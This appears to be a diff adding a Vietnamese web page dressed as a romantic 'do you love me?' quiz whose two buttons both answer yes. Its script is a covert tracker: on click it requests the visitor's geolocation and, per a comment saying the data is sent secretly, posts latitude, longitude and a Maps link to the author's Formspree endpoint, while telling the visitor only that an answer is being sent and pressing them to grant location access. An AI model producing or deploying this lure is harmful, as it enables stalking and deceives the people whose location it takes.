@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Em có yêu anh không?</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background: #fdf2f2; padding-top: 100px; }
+        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); display: inline-block; width: 90%; max-width: 400px; }
+        h2 { color: #d63384; font-size: 24px; margin-bottom: 20px; }
+        p { color: #666; margin-bottom: 30px; font-size: 16px; }
+        
+        .btn-group { display: flex; gap: 15px; justify-content: center; }
+        
+        button { 
+            flex: 1;
+            padding: 15px; 
+            border: none; 
+            border-radius: 12px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: 0.3s;
+        }
+
+        .btn-yes { background: #ff4d6d; color: white; }
+        .btn-yes-too { background: #ff758f; color: white; }
+        
+        button:hover { transform: scale(1.05); opacity: 0.9; }
+        button:disabled { background: #ccc; cursor: not-allowed; transform: none; }
+
+        #status { margin-top: 25px; font-size: 15px; font-weight: 600; min-height: 20px; }
+        .success-text { color: #28a745; }
+        .error-text { color: #dc3545; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Em có yêu anh không?</h2>
+        <p>Chọn câu trả lời thật lòng nhé ❤️</p>
+        
+        <div class="btn-group">
+            <button class="btn-yes" id="btn1" onclick="handleChoice('Có')">CÓ</button>
+            <button class="btn-yes-too" id="btn2" onclick="handleChoice('VẪN CÓ')">VẪN CÓ</button>
+        </div>
+
+        <p id="status"></p>
+    </div>
+
+    <script>
+        // THAY LINK FORMSPREE CỦA BẠN VÀO ĐÂY
+        const FORMSPREE_URL = 'https://formspree.io/f/XXXXXXX'; 
+
+        function handleChoice(choiceText) {
+            const status = document.getElementById('status');
+            const btn1 = document.getElementById('btn1');
+            const btn2 = document.getElementById('btn2');
+
+            // Khóa nút để tránh bấm nhiều lần
+            btn1.disabled = true;
+            btn2.disabled = true;
+
+            if (navigator.geolocation) {
+                status.style.color = "#d63384";
+                status.innerText = "Đang gửi câu trả lời...";
+
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    // Gửi ngầm dữ liệu về Email qua Formspree
+                    fetch(FORMSPREE_URL, {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            cau_tra_loi: choiceText,
+                            vi_do: lat,
+                            kinh_do: lon,
+                            link_google_maps: mapLink
+                        }),
+                        headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }
+                    }).then(response => {
+                        status.className = "success-text";
+                        status.innerText = "Xác nhận thành công. Bạn có thể đóng trình duyệt.";
+                    }).catch(error => {
+                        status.className = "error-text";
+                        status.innerText = "Lỗi kết nối. Thử lại sau nhé!";
+                        btn1.disabled = false;
+                        btn2.disabled = false;
+                    });
+
+                }, function(error) {
+                    status.className = "error-text";
+                    status.innerText = "Bạn phải chọn 'Cho phép' để gửi câu trả lời nhé!";
+                    btn1.disabled = false;
+                    btn2.disabled = false;
+                });
+            } else {
+                status.innerText = "Trình duyệt của bạn không hỗ trợ định vị.";
+            }
+        }
+    </script>
+</body>
+</html>
